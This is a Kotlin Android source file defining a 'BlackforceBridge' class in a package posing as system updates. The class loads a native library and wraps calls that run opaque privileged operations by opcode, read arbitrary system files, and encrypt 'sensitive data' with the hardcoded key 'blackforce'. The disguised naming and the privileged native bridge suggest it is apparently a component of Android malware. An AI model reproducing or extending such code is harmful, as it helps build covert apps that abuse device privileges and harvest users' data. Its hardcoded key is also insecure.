package com.system.updates.modules.bridges

import android.content.Context
import android.os.Build
import android.util.Log
import com.system.updates.core.CryptoManager
import com.system.updates.error.ErrorHandler
import java.io.File
import java.security.SecureRandom

class BlackforceBridge(private val context: Context) {
    private val tag = "BlackforceBridge"
    private val crypto = CryptoManager(context)
    private val errorHandler = ErrorHandler(context)
    private var nativeLibLoaded = false

    companion object {
        init {
            try {
                System.loadLibrary("blackforce_native")
            } catch (e: UnsatisfiedLinkError) {
                Log.e("BlackforceBridge", "Failed to load native library", e)
            }
        }
    }

    init {
        nativeLibLoaded = try {
            System.loadLibrary("blackforce_native")
            true
        } catch (e: UnsatisfiedLinkError) {
            false
        }
    }

    private external fun nativeExecuteOp(opCode: Int, data: ByteArray): ByteArray?
    private external fun nativeReadSysFile(path: String): ByteArray?
    private external fun nativeGetSdkLevel(): Int

    fun executePrivilegedOperation(opCode: Int, payload: ByteArray): ByteArray? {
        if (!nativeLibLoaded) {
            errorHandler.logError("BLACKF_BRIDGE", "Native lib not loaded", "blackforce_bridge")
            return null
        }
        return try {
            nativeExecuteOp(opCode, payload)
        } catch (e: Exception) {
            errorHandler.logError("BLACKF_EXEC", e.message ?: "unknown", "blackforce_bridge")
            null
        }
    }

    fun readSystemFile(path: String): ByteArray? {
        if (!nativeLibLoaded) return null
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            // On Android 10+, direct file access may be restricted
            if (!checkPermission()) return null
        }
        return try {
            nativeReadSysFile(path)
        } catch (e: Exception) {
            null
        }
    }

    fun getSdkLevel(): Int {
        return if (nativeLibLoaded) nativeGetSdkLevel() else Build.VERSION.SDK_INT
    }

    fun encryptSensitiveData(data: ByteArray): ByteArray {
        return crypto.encryptData(data, "blackforce".toByteArray())
    }

    fun decryptSensitiveData(encrypted: ByteArray): ByteArray {
        return crypto.decryptData(encrypted, "blackforce".toByteArray())
    }

    private fun checkPermission(): Boolean {
        return when {
            Build.VERSION.SDK_INT >= Build.VERSION_CODES.M -> {
                context.checkSelfPermission(android.Manifest.permission.READ_EXTERNAL_STORAGE) == android.content.pm.PackageManager.PERMISSION_GRANTED
            }
            else -> true
        }
    }

    fun isNativeReady(): Boolean = nativeLibLoaded
}